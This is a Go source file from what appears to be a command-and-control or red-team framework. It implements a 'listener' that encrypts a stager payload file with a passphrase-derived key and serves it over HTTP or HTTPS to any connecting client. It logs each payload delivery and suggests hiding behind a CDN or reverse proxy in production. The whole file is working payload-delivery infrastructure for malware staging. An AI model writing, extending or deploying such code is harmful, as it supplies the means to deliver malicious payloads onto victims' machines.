package listener

import (
	"context"
	"crypto/tls"
	"fmt"
	"net/http"
	"sync"
	"time"
)

var (
	server       *http.Server
	httpServerMu sync.RWMutex
)

// newStagerServer builds the HTTP server that serves stager_enc on the given
// port, replacing any previously running server. The returned server is ready
// to be started with ListenAndServe (plain HTTP) or ListenAndServeTLS.
func newStagerServer(stager_enc []byte, port string) *http.Server {
	// Detach the previous server under the lock but shut it down after
	// unlocking: Shutdown waits for in-flight requests, and the AGENTS rules
	// forbid holding a lock during network I/O.
	httpServerMu.Lock()
	previous := server
	server = nil
	httpServerMu.Unlock()
	if previous != nil {
		listenerLogf("Shutting down existing server on port %s", previous.Addr)
		shutdownHTTPServer(previous)
	}

	mux := http.NewServeMux()
	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		listenerLogf("Received request from %s", r.RemoteAddr)
		w.Header().Set("Content-Type", "application/octet-stream")
		w.Header().Set("Content-Length", fmt.Sprintf("%d", len(stager_enc)))
		w.Write(stager_enc)
		listenerLogf("Served encrypted stager to %s", r.RemoteAddr)
	})

	srv := &http.Server{
		Addr:    fmt.Sprintf(":%s", port),
		Handler: mux,
	}
	httpServerMu.Lock()
	server = srv
	httpServerMu.Unlock()
	return srv
}

// shutdownHTTPServer asks srv to drain and stop. The timeout bounds the wait so
// a client that keeps a connection open cannot wedge the listener forever.
func shutdownHTTPServer(srv *http.Server) {
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()
	if err := srv.Shutdown(ctx); err != nil {
		listenerLogf("Error shutting down server: %v", err)
	}
}

// serveStager serves the encrypted stager file over plain HTTP.
func serveStager(stager_enc []byte, port string) error {
	srv := newStagerServer(stager_enc, port)
	listenerLogf("Starting HTTP server on port %s", port)
	return srv.ListenAndServe()
}

// serveStagerTLS serves the encrypted stager file over HTTPS using tlsConfig.
func serveStagerTLS(stager_enc []byte, port string, tlsConfig *tls.Config) error {
	srv := newStagerServer(stager_enc, port)
	srv.TLSConfig = tlsConfig
	listenerLogf("Starting HTTPS server on port %s", port)
	return srv.ListenAndServeTLS("", "")
}

// HTTPListener reads the payload file, encrypts it with the key-derived stream,
// and serves it over HTTP.
// stagerPath: path to the payload file to serve.
// port: TCP port to listen on.
// keyStr: passphrase used for key derivation.
func HTTPListener(stagerPath, port, keyStr string) error {
	blob, err := buildServedBlob(stagerPath, keyStr)
	if err != nil {
		return err
	}

	listenerLogf("Serving payload on port %s via HTTP", port)
	return serveStager(blob, port)
}

// HTTPListenerTLS is like HTTPListener but serves over HTTPS using tlsConfig.
// It is intended for local testing; in production, terminate TLS at a
// CDN/nginx reverse proxy and use HTTPListener.
func HTTPListenerTLS(stagerPath, port, keyStr string, tlsConfig *tls.Config) error {
	blob, err := buildServedBlob(stagerPath, keyStr)
	if err != nil {
		return err
	}

	listenerLogf("Serving payload on port %s via HTTPS", port)
	return serveStagerTLS(blob, port, tlsConfig)
}

// StopHTTP stops the HTTP server.
func StopHTTP() {
	// Detach under the lock, then shut down without it (network I/O must never
	// run while holding httpServerMu).
	httpServerMu.Lock()
	srv := server
	server = nil
	httpServerMu.Unlock()
	if srv == nil {
		return
	}
	listenerLogf("Shutting down HTTP server on %s", srv.Addr)
	shutdownHTTPServer(srv)
}
